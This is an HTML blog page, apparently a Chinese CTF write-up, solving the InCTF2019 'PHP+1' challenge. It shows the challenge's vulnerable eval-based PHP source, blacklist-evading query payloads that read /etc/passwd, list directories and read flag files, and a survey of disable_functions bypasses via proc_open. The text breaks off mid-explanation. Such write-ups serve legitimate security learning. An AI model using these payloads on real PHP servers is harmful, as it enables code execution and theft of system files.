@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>InCTF2019-PHP1.0+PHP1.5 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">InCTF2019-PHP1.0+PHP1.5</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 9, 2020&nbsp;&nbsp;10:13:20</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h4 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h4><p>这是一道代码审计题，涉及到的考点是：</p>
+<ol>
+<li><code>proc_open</code>代码执行</li>
+<li>php字符串拼接</li>
+<li><code>is_file</code>和<code>file_exists</code>函数的差别</li>
+</ol>
+<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>因为这道题没有在线的环境，所以我自己配了一个，主要就是要设置<code>disable_functions</code>，因为禁掉了很多函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir</span><br></pre></td></tr></table></figure>
+
+<p>修改<code>php.ini</code>文件中的<code>disable_functions</code>，重启服务器即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># chmod 4511 readFlag</span><br><span class="line"># ls -al readFlag</span><br><span class="line">-r-s--x--x 1 root root 8608 May  6 07:52 readFlag</span><br><span class="line"></span><br><span class="line"># chmod 400 flag# </span><br><span class="line"># ls -al flag</span><br><span class="line">-r-------- 1 root root 8608 May  6 08:43 flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP+1"></a>PHP+1</h2><p>打开题目直接得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// PHP+1</span></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $input;</span><br><span class="line">  <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">      <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">  <span class="keyword">unset</span>($blacklist);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille=$_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_file($thisfille))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(file_exists($thisfille))&#123;</span><br><span class="line">    <span class="keyword">if</span>(check())&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>($input);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($ass <span class="keyword">as</span> $hole)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>ps： 修正符<code>m</code>表示 将字符串视为多行,不管是那行都能匹配; </p>
+<p>先分析下代码主要的执行流程：</p>
+<ol>
+<li>接受两个get请求参数，一个<code>input</code>，另一个<code>thisfile</code>，分别赋值给<code>$input</code>和<code>$thisfille</code>（注意拼写，两个l）；</li>
+<li>第一层：传入的<code>$thisfille</code>需要同时满足<code>is_file($thisfille)</code>为<code>false</code>，<code>file_exists($thisfile)</code>为<code>true</code>；</li>
+<li>第二层：如果<code>file_exists($thisfile)</code>为<code>true</code>，则进行<code>check()</code>函数检查；</li>
+<li><code>check()</code>函数中过滤了很多函数。</li>
+</ol>
+<h5 id="第一层-is-file和file-exists绕过"><a href="#第一层-is-file和file-exists绕过" class="headerlink" title="第一层 is_file和file_exists绕过"></a>第一层 is_file和file_exists绕过</h5><p><code>is_file</code>函数用来判断文件是否存在并且检查指定的文件名是否是正常的文件；</p>
+<p><code>file_exists</code>函数判断文件是否存在或者是目录是否存在;</p>
+<p><code>is_dir</code>函数判断目录是否存在。</p>
+<p>也就是说，所以可以用一个目录路径来绕过<code>is_file</code>的检查，对任意目录，<code>is_file</code>会返回false，而<code>file_exists</code>会返回true。</p>
+<h5 id="第二层-check函数绕过"><a href="#第二层-check函数绕过" class="headerlink" title="第二层 check函数绕过"></a>第二层 check函数绕过</h5><p>在<code>check</code>函数中能看到一个看起来比较有趣的函数<code>get_defined_functions</code>，搜一下它的用法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"This is my function foo."</span>;</span><br><span class="line">&#125;</span><br><span class="line">$arr = get_defined_functions();</span><br><span class="line">var_dump($arr);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出的结果包含所有的php自带的built-in函数和用户自定义函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> (size=<span class="number">2</span>)</span><br><span class="line">  <span class="string">'internal'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">1460</span>)</span><br><span class="line">      <span class="number">0</span> =&gt; string <span class="string">'zend_version'</span> (length=<span class="number">12</span>)</span><br><span class="line">      <span class="number">1</span> =&gt; string <span class="string">'func_num_args'</span> (length=<span class="number">13</span>)</span><br><span class="line">      <span class="number">2</span> =&gt; string <span class="string">'func_get_arg'</span> (length=<span class="number">12</span>)</span><br><span class="line">      <span class="number">3</span> =&gt; string <span class="string">'func_get_args'</span> (length=<span class="number">13</span>)</span><br><span class="line">      <span class="number">4</span> =&gt; string <span class="string">'strlen'</span> (length=<span class="number">6</span>)</span><br><span class="line">      <span class="number">5</span> =&gt; string <span class="string">'strcmp'</span> (length=<span class="number">6</span>)</span><br><span class="line">      ...... more elements</span><br><span class="line">      <span class="number">1456</span> =&gt; string <span class="string">'xdebug_code_coverage_started'</span> (length=<span class="number">28</span>)</span><br><span class="line">      <span class="number">1457</span> =&gt; string <span class="string">'xdebug_get_function_count'</span> (length=<span class="number">25</span>)</span><br><span class="line">      <span class="number">1458</span> =&gt; string <span class="string">'xdebug_dump_superglobals'</span> (length=<span class="number">25</span>)</span><br><span class="line">      <span class="number">1459</span> =&gt; string <span class="string">'xdebug_get_headers'</span> (length=<span class="number">18</span>)</span><br><span class="line">  <span class="string">'user'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">      <span class="number">0</span> =&gt; string <span class="string">'foo'</span> (length=<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<p>返回结果包括两个数组，内置（internal）和用户自定义的函数。可以通过<code>$arr[&#39;internal&#39;]</code>来访问系统内置的函数，通过<code>$arr[&#39;user&#39;]</code>来访问用户自定义的函数。</p>
+<p><img src="/2020/05/09/InCTF2019-PHP1-0-PHP1-5/imgs/1.png" alt="1"></p>
+<p>在这里<code>eval</code>函数并不属于php的内置函数，所以可以绕过上面代码中第7至11行的检查。</p>
+<p>但看到这里我还是觉得比较奇怪的，所以去google了一下，发现第14行过滤的<code>eval</code>，<code>die</code>和<code>exit</code>都不属于函数，它们都属于<strong>语言构造器（ language construct ）</strong>。</p>
+<p>这里稍微介绍一下<code>language construct</code>。从本质上讲，function是一段代码，它的编写方式可以在脚本执行过程中多次使用和重复使用。它可能被设计成接受参数和返回值，也可能两者都不接受，函数可以由用户定义。language construct本身是PHP语言的一部分，也就是说，它们不能由用户定义，也不能通过扩展加入到PHP语言中，PHP解析器不能进一步分解它们，而函数在被解析之前必须进一步分解，会被分解为language construct。</p>
+<p>language construct通常会比对应的function更快。而且我们可以通过设置在PHP配置文件，如<code>php.ini</code>中通过<code>disable_functions</code>禁用一些函数，但是无法禁用language construct。而且language construct不能作为回调函数被调用。</p>
+<p>这是来自 <a href="https://www.php.net/manual/zh/function.eval.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.eval.php</a> 对<code>eval</code>的解释：<img src="/2020/05/09/InCTF2019-PHP1-0-PHP1-5/imgs/2.png" alt="2"></p>
+<p><code>die</code>和<code>exit</code>一样，都是一个语言构造器：</p>
+<p><img src="/2020/05/09/InCTF2019-PHP1-0-PHP1-5/imgs/3.png" alt="3"></p>
+<p>所以它们并不在函数<code>get_defined_functions</code>中返回的数组中。</p>
+<p>php中的语言构造器有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">die</span></span><br><span class="line"><span class="keyword">include</span></span><br><span class="line"><span class="keyword">require</span></span><br><span class="line"><span class="keyword">empty</span></span><br><span class="line"><span class="keyword">isset</span></span><br><span class="line"><span class="keyword">unset</span></span><br><span class="line"><span class="keyword">list</span></span><br><span class="line"><span class="keyword">array</span></span><br></pre></td></tr></table></figure>
+
+<p>而且在PHP中，<code>_()</code>也是一个函数，<code>_()</code>是<code>gettext</code>函数的别名。</p>
+<p><img src="/2020/05/09/InCTF2019-PHP1-0-PHP1-5/imgs/5.png" alt="5"></p>
+<p>所以<code>_</code>也会被<code>$blacklist</code>过滤掉。</p>
+<p>虽然<code>$blacklist</code>过滤掉了很多php内置函数，但是<code>eval</code>函数依然是可以使用的，所以可以通过<code>eval</code>来执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;eval(&quot;highlight&quot;.$thisfille[8].&quot;fil&quot;.&quot;e(&#39;&#x2F;etc&#x2F;passwd&#39;);&quot;);&amp;thisfile&#x3D;&#x2F;lib&#x2F;x86_64-linux-gnu</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/09/InCTF2019-PHP1-0-PHP1-5/imgs/6.png" alt="6"></p>
+<p>所以可以用<code>eval(&quot;sy&quot;.&quot;stem(&#39;ls&#39;)&quot;)</code>来查看当前目录下的文件，但是并没有执行成功，因为<code>system</code>函数被禁用了。看一下有多少函数是<code>disable_functions</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;eval(&quot;php&quot;.&quot;info();&quot;);&amp;thisfile&#x3D;&#x2F;var</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/09/InCTF2019-PHP1-0-PHP1-5/imgs/4.png" alt="4"></p>
+<p>看一下<code>disable_functions</code>这一栏，有很多函数不能用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir</span><br></pre></td></tr></table></figure>
+
+<p>因为不知道flag到底在哪里，文件名是什么，所以肯定想看一下目录，一般flag文件会放在当前目录，根目录下或者是上一级目录里。常用的列目录的命令有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">'ls'</span>);</span><br><span class="line">scandir(<span class="string">'/'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>但是目前这些方法都被禁止了。所以我们要找到其他的相同功能的函数，一般这种题目考察的就是这些相对冷门的函数。</p>
+<p><code>glob</code>函数没有在上面的<code>disable_functions</code>之中，这个函数和<code>scandir</code>一样，可以用来查找文件，举个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 取得所有后缀为.txt的文件</span></span><br><span class="line">$files = glob(<span class="string">'*.txt'</span>);</span><br><span class="line">print_r($files);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面会输出当前目录下的所有以<code>.txt</code>为后缀的文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( </span><br><span class="line">    [<span class="number">0</span>] =&gt; Readme.txt </span><br><span class="line">    [<span class="number">1</span>] =&gt; source.txt </span><br><span class="line">    [<span class="number">2</span>] =&gt; test.txt </span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>所以用<code>print_r(glob(&quot;*&quot;))</code>就可以列出当前目录下的所有文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input=<span class="keyword">eval</span>(<span class="string">'print'</span>.$thisfille[<span class="number">8</span>].<span class="string">'r(glo'</span>.<span class="string">'b("*"));'</span>);&amp;thisfile=/lib/x86_64-linux-gnu</span><br></pre></td></tr></table></figure>
+
+<p>得到的结果是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( </span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1.</span>html </span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">5.</span>html </span><br><span class="line">    [<span class="number">2</span>] =&gt; index.html </span><br><span class="line">    [<span class="number">3</span>] =&gt; index.php </span><br><span class="line">    [<span class="number">4</span>] =&gt; save2json.html </span><br><span class="line">    [<span class="number">5</span>] =&gt; version_2.html </span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>再看看根目录：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( </span><br><span class="line">    [<span class="number">0</span>] =&gt; /bin </span><br><span class="line">    [<span class="number">1</span>] =&gt; /boot </span><br><span class="line">    [<span class="number">2</span>] =&gt; /daily_lock </span><br><span class="line">    [<span class="number">3</span>] =&gt; /dev </span><br><span class="line">    [<span class="number">4</span>] =&gt; /etc </span><br><span class="line">    [<span class="number">5</span>] =&gt; /flag </span><br><span class="line">    [<span class="number">6</span>] =&gt; /home </span><br><span class="line">    [<span class="number">7</span>] =&gt; /initrd.img </span><br><span class="line">    [<span class="number">8</span>] =&gt; /initrd.img.old </span><br><span class="line">    [<span class="number">9</span>] =&gt; /lib </span><br><span class="line">    [<span class="number">10</span>] =&gt; /lib64 </span><br><span class="line">    [<span class="number">11</span>] =&gt; /lost+found </span><br><span class="line">    [<span class="number">12</span>] =&gt; /media </span><br><span class="line">    [<span class="number">13</span>] =&gt; /mnt </span><br><span class="line">    [<span class="number">14</span>] =&gt; /opt </span><br><span class="line">    [<span class="number">15</span>] =&gt; /proc </span><br><span class="line">    [<span class="number">16</span>] =&gt; /readFlag </span><br><span class="line">    [<span class="number">17</span>] =&gt; /root </span><br><span class="line">    [<span class="number">18</span>] =&gt; /run </span><br><span class="line">    [<span class="number">19</span>] =&gt; /sbin </span><br><span class="line">    [<span class="number">20</span>] =&gt; /srv </span><br><span class="line">    [<span class="number">21</span>] =&gt; /sys </span><br><span class="line">    [<span class="number">22</span>] =&gt; /tmp </span><br><span class="line">    [<span class="number">23</span>] =&gt; /usr </span><br><span class="line">    [<span class="number">24</span>] =&gt; /<span class="keyword">var</span> </span><br><span class="line">    [<span class="number">25</span>] =&gt; /vmlinuz </span><br><span class="line">    [<span class="number">26</span>] =&gt; /vmlinuz.old </span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>flag应该就在<code>/flag</code>文件或是<code>/readFlag</code>文件中。所以接下来就要读这两个文件。</p>
+<p>一般读取文件有两种方式。一种是通过系统命令执行linux的读文件命令，另一种是直接调用php的文件读取函数。常见的文件读取函数有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents</span><br><span class="line">readfile</span><br><span class="line">fread</span><br><span class="line">fopen</span><br><span class="line">highlight_file</span><br><span class="line">show_source</span><br></pre></td></tr></table></figure>
+
+<p>前面的四个都被禁掉了，但是最后的<code>highlight_file</code>和<code>show_source</code>都没有被禁掉，所以还可以用这两个函数来读取文件内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// show_source("/flag");</span></span><br><span class="line">?input=<span class="keyword">eval</span>(<span class="string">'show'</span>.$thisfille[<span class="number">8</span>].<span class="string">'source("/flag");'</span>);&amp;thisfile=/lib/x86_64-linux-gnu</span><br><span class="line">    </span><br><span class="line"><span class="comment">// highlight_file("/readFlag");</span></span><br><span class="line">?input=<span class="keyword">eval</span>(<span class="string">'highlight'</span>.$thisfille[<span class="number">8</span>].<span class="string">'fil'</span>.<span class="string">'e("/readFlag");'</span>);&amp;thisfile=/lib/x86_64-linux-gnu</span><br></pre></td></tr></table></figure>
+
+<p>发现什么输出都没有，猜测可能是普通用户根本就没有read的权限。如果不能读的话，猜测这可能是一个可执行文件，所以需要命令执行函数来执行该文件，该文件会输出flag内容。但是这里有两个flag，显然其中一个是用来迷惑我们的，但是目前还没有办法判断哪个是真的flag。</p>
+<p>php中比较常见的命令执行函数有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exec — 执行一个外部程序</span><br><span class="line">passthru — 执行外部程序并且显示原始输出</span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入&#x2F;输出的文件指针</span><br><span class="line">pcntl_exec - 在当前进程空间执行指定程序</span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</span><br><span class="line">system — 执行外部程序，并且显示输出</span><br><span class="line">popen - 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</span><br><span class="line">ob_start - 打开输出控制缓冲</span><br><span class="line">mail - 发送邮件</span><br></pre></td></tr></table></figure>
+
+<p>这些函数的具体用法可以参考chybeta师傅的文章：</p>
+<blockquote>
+<p><a href="[https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/](https://chybeta.github.io/2017/08/08/php代码-命令执行漏洞/)">php代码/命令执行漏洞</a></p>
+</blockquote>
+<p>这些函数中，有两个没有被ban，<code>ob_start</code>和<code>proc_open</code>。</p>
+<p><strong>proc_open</strong>函数的具体用法可以参考： <a href="https://www.w3cschool.cn/doc_php/php-function-proc-open.html" target="_blank" rel="noopener">https://www.w3cschool.cn/doc_php/php-function-proc-open.html</a> </p>
+<p>语法：<code>resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )</code></p>
+<p><code>proc_open</code>会执行一个命令，并且会打开用来输入/输出的文件指针，输出在<code>$pipes[1]</code>中。</p>
+<p>可以看一个最简单的例子，在读取<code>$pipes[1]</code>的时候还可以用<code>fgets</code>：</p>
